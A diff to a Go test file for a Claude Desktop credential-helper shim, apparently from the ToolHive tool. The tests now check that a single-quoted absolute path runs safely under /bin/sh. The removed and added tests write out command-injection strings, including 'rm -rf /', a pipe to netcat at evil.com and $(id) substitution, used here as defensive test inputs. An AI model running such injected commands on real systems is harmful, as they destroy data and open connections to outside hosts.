@@ -6,7 +6,9 @@ package client
 import (
 	"encoding/json"
 	"os"
+	"os/exec"
 	"path/filepath"
+	"runtime"
 	"strings"
 	"testing"
 
@@ -50,9 +52,11 @@ func readConfigDoc(t *testing.T, path string) claudeDesktopConfig {
 
 func claudeDesktopApplyCfg() llmgateway.ApplyConfig {
 	return llmgateway.ApplyConfig{
-		GatewayURL:         "https://gw.example.com",
-		AnthropicBaseURL:   "https://gw.example.com/anthropic",
-		TokenHelperCommand: `thv llm token`,
+		GatewayURL:       "https://gw.example.com",
+		AnthropicBaseURL: "https://gw.example.com/anthropic",
+		// The shim consumes TokenHelperPath (the absolute thv path), not the
+		// shell-string TokenHelperCommand that direct-mode clients use.
+		TokenHelperPath: "/opt/toolhive/bin/thv",
 	}
 }
 
@@ -85,7 +89,7 @@ func TestConfigureCredentialHelper_WritesConfigMetaAndShim(t *testing.T) {
 	assert.Equal(t, os.FileMode(0o700), info.Mode().Perm())
 	shim, err := os.ReadFile(shimPath) // #nosec G304 -- test-controlled path
 	require.NoError(t, err)
-	assert.Contains(t, string(shim), `thv llm token`)
+	assert.Contains(t, string(shim), `exec '/opt/toolhive/bin/thv' llm token`)
 	assert.Contains(t, string(shim), "--skip-browser")
 
 	// _meta.json selects our config by the config document's id.
@@ -274,36 +278,75 @@ func TestRevertCredentialHelper_RejectsUnsafeConfigPath(t *testing.T) {
 	}
 }
 
-// TestWriteCredentialHelperShim_RejectsUnsafeCommand proves the shim writer
-// fails closed on any tokenHelperCommand it cannot prove is shell-safe, rather
-// than emitting an injectable 0700 /bin/sh script. The producer is a constant
-// today; this guards against a future caller that isn't.
-func TestWriteCredentialHelperShim_RejectsUnsafeCommand(t *testing.T) {
+// TestWriteCredentialHelperShim_RequiresPath proves the writer fails closed
+// when no absolute thv path is available (os.Executable() failed upstream)
+// rather than emitting a shim that cannot locate thv.
+func TestWriteCredentialHelperShim_RequiresPath(t *testing.T) {
 	t.Parallel()
 	cm := &ClientManager{homeDir: t.TempDir()}
 
-	unsafe := []string{
-		`thv llm token; rm -rf /`,           // trailing command via ;
-		`thv llm token #`,                   // trailing comment
-		`thv llm token && curl evil`,        // chained command
-		`thv llm token|nc evil.com`,         // pipe to external process
-		`thv llm token` + "\n" + `rm -rf /`, // embedded newline
-		"thv llm token `id`",                // command substitution
-		`thv llm token $(id)`,               // command substitution
-		`"thv" llm token`,                   // quotes would nest inside the exec line
-		``,                                  // empty
-	}
-	for _, cmd := range unsafe {
-		t.Run(cmd, func(t *testing.T) {
-			t.Parallel()
-			_, err := cm.writeCredentialHelperShim(cmd)
-			require.Error(t, err, "expected rejection of %q", cmd)
-		})
+	_, err := cm.writeCredentialHelperShim("")
+	require.Error(t, err)
+}
+
+// TestWriteCredentialHelperShim_UsesAbsolutePath proves the shim execs the
+// absolute thv path rather than a bare "thv". A bare command is unusable here:
+// Claude Desktop is only ever GUI-launched, so it inherits launchd's PATH,
+// which does not contain thv's install directory (~/.toolhive/bin).
+func TestWriteCredentialHelperShim_UsesAbsolutePath(t *testing.T) {
+	t.Parallel()
+	cm := &ClientManager{homeDir: t.TempDir()}
+
+	shimPath, err := cm.writeCredentialHelperShim("/opt/toolhive/bin/thv")
+	require.NoError(t, err)
+	shim, err := os.ReadFile(shimPath) // #nosec G304 -- test-controlled path
+	require.NoError(t, err)
+
+	assert.Contains(t, string(shim), `exec '/opt/toolhive/bin/thv' llm token`)
+	assert.Contains(t, string(shim), `exec '/opt/toolhive/bin/thv' llm token --skip-browser`)
+	// The interactive branch must NOT pass --skip-browser: it is the only
+	// context permitted to open a browser for a full OIDC re-auth.
+	interactive, _, found := strings.Cut(string(shim), "\nfi\n")
+	require.True(t, found, "shim must have an interactive branch terminated by fi")
+	assert.NotContains(t, interactive, "--skip-browser")
+}
+
+// TestWriteCredentialHelperShim_ExecutesWithHostilePath is the load-bearing test
+// for deleting the old metacharacter blocklist: it runs the generated shim under
+// /bin/sh with a thv path containing a space, a single quote, a double quote, a
+// dollar sign, a backtick, a semicolon and a newline, and asserts the arguments
+// arrive intact. Proving execution (not just string shape) is what establishes
+// that single-quoting is a total transform, so no path needs to be rejected.
+func TestWriteCredentialHelperShim_ExecutesWithHostilePath(t *testing.T) {
+	t.Parallel()
+	if runtime.GOOS == "windows" {
+		t.Skip("shim is a POSIX /bin/sh script")
 	}
 
-	// The bare command the producer actually emits is accepted.
-	_, err := cm.writeCredentialHelperShim(`thv llm token`)
+	// A directory name exercising every character the old blocklist rejected,
+	// plus a newline — which survives single-quoting intact and so would have
+	// been the one case a "reject metacharacters" scheme could not have fixed.
+	hostileDir := filepath.Join(t.TempDir(), "we ird's \"$(id)\" `id`;\nrm -rf")
+	require.NoError(t, os.MkdirAll(hostileDir, 0o700))
+	fakeThv := filepath.Join(hostileDir, "thv")
+	// A stand-in for thv that echoes the args it received.
+	require.NoError(t, os.WriteFile(fakeThv, []byte("#!/bin/sh\necho \"ARGS: $*\"\n"), 0o700)) //nolint:gosec // G306: must be executable
+
+	cm := &ClientManager{homeDir: t.TempDir()}
+	shimPath, err := cm.writeCredentialHelperShim(fakeThv)
 	require.NoError(t, err)
+
+	// Silent context: --skip-browser is appended.
+	out, err := exec.Command("/bin/sh", shimPath).CombinedOutput() // #nosec G204 -- test-controlled path
+	require.NoError(t, err, "shim failed: %s", out)
+	assert.Equal(t, "ARGS: llm token --skip-browser", strings.TrimSpace(string(out)))
+
+	// Interactive context: no --skip-browser, so a browser flow is permitted.
+	cmd := exec.Command("/bin/sh", shimPath) // #nosec G204 -- test-controlled path
+	cmd.Env = append(os.Environ(), "CLAUDE_HELPER_CONTEXT=interactive")
+	out, err = cmd.CombinedOutput()
+	require.NoError(t, err, "shim failed: %s", out)
+	assert.Equal(t, "ARGS: llm token", strings.TrimSpace(string(out)))
 }
 
 func TestConfigureCredentialHelper_CleansUpOnWriteFailure(t *testing.T) {
